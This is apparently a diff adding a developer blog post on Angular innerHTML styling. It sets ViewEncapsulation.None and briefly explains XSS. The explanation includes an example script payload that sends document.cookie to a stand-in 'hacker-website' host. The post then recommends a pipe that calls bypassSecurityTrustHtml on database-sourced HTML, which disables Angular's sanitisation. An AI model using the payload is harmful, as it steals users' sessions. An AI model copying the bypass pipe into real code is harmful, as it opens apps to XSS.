@@ -1,0 +1,102 @@
+# Angular innerHTML not taking CSS
+
+![N|Solid](../assets/blog/pics/angularicon.png)
+
+I ran into this issue with building this vary blog.
+
+  - Display blog posts from JSON correctly
+  - Use websites CSS
+  - Angular Magic
+
+# Scenario
+
+  - My blog posts come back as JSON from the DB
+  - Showing the HTML inline correctly
+
+My blog.component.html looks like:
+```sh
+<section id="mainblog" class="blogContainer">
+  <mat-card class="blogCard" *ngFor="let item of feed.items; let i = index">
+    <mat-card-header>
+      <mat-card-title>{{ item.title }}</mat-card-title>
+    </mat-card-header>
+    <mat-card-content>
+      <div [innerHTML]="item.content"></div>
+    </mat-card-content>
+  </mat-card>
+</section>
+```
+
+The main code being:
+```sh
+  <div [innerHTML]="item.content"></div>
+```
+When the JSON returns the blogs to display, the Material card wasn't displaying the content correctly.
+
+Here you can see the images were hanging off the side of the card:
+![InnerHtml Error](../assets/blog/pics/innerhtmlerror.png)
+
+# Add the ViewEncapsulation
+```sh
+import {
+  Component,
+  OnInit,
+  ChangeDetectionStrategy,
+  ViewEncapsulation,
+} from '@angular/core';
+@Component({
+  selector: 'app-blog',
+  templateUrl: './blog.component.html',
+  styleUrls: ['./blog.component.scss'],
+  changeDetection: ChangeDetectionStrategy.Default,
+  encapsulation: ViewEncapsulation.None
+})
+```
+By adding in the ViewEncapsulation.None we can see the HTML is now being rendered correctly:
+![InnerHtml Error](../assets/blog/pics/innerhtmlnoerror.png)
+
+And whene we look at the Div elements the CSS is now being applied correctly:
+![InnerHtml Error](../assets/blog/pics/innerhtmlcss.png)
+
+# But wait!
+Cross-site Scripting or XSS is probably the most common website security vulnerability. It enables an attacker to inject client-side script into web pages viewed by other users.
+So, you want to be real careful on what kind of data you are returning and then displaying. The most notable way to see this exploitation is in a comments section of a website.
+
+A vulnerability in cross-site scripting would be if a someone put a comment of:
+
+```sh
+ <script>
+ window.location=’http://hacker-website/?cookie='+document.cookie
+</script>
+```
+Now the website will redirect to the hacker website anytime the comments are loaded in the encapsulation.
+
+# Angular has built in protection for XSS:
+>Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.
+
+But if you need to bypass this built in security feature and have your links shown correclty you just need to add in a sanitzer pipe. This Pipe will use the DomSanitizer service like:
+```sh
+  <div [innerHTML]="item.content| safeHtml"></div>
+```
+
+The Pipe looks like this in the Angular project:
+```sh
+  import { Pipe, PipeTransform } from '@angular/core';
+import { DomSanitizer } from '@angular/platform-browser';
+
+@Pipe({
+  name: 'safeHtml',
+})
+export class SafeHtmlPipe implements PipeTransform {
+  constructor(private sanitizer: DomSanitizer) {}
+
+  transform(html) {
+    return this.sanitizer.bypassSecurityTrustHtml(html);
+  }
+}
+```
+
+For more information on cross-scite scripting(XSS) hit up this [link](https://angular.io/guide/security)
+
+
+
